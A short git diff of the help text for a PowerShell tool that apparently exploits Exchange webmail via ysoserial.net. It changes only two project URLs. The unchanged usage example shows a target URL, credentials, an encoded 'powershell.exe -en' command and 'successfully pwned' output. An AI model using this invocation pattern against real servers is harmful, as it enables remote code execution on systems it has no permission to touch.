@@ -33,7 +33,7 @@ function Invoke-PSForgot2kEyXCHANGE {
     .PARAMETER IgnoreSSL
     Ignore invalid SSL certificates.
     .LINK
-    https://github.com/justin-p/PSDNSDumpsterAPI
+    https://github.com/justin-p/PSForgot2kEyXCHANGE
     .EXAMPLE
     PS> Invoke-Forgot2kEyXCHANG -Server 'https://webmail.domain.tld' -User 'Steve.McGreeve@domain.tld' -Password 'Summer2020!' -Command 'cmd /c powershell.exe -en dwByAGkAdABlAC0AaABvAHMAdAAgACcASQAnAG0AIABhACAAcwB0AGkAbgBrAHkAIABzAGsAaQBkACAAdwBoAG8AIAByAHUAbgBzACAAcgBhAG4AZABvAG0AIABjAG8AZABlACAAOgApACcA=' -YsoserialPath 'C:\tools\ysoserial.net\ysoserial.exe'
     [+] Login successfully!
@@ -41,7 +41,7 @@ function Invoke-PSForgot2kEyXCHANGE {
     [+] Got a 500 response, successfully pwned https://webmail.domain.tld !
     .NOTES
     Author: Justin Perdok, https://justin-p.me
-    Project: https://github.com/justin-p/PSDNSDumpsterAPI
+    Project: https://github.com/justin-p/PSForgot2kEyXCHANGE
     #>    
     [cmdletbinding()]
     Param(
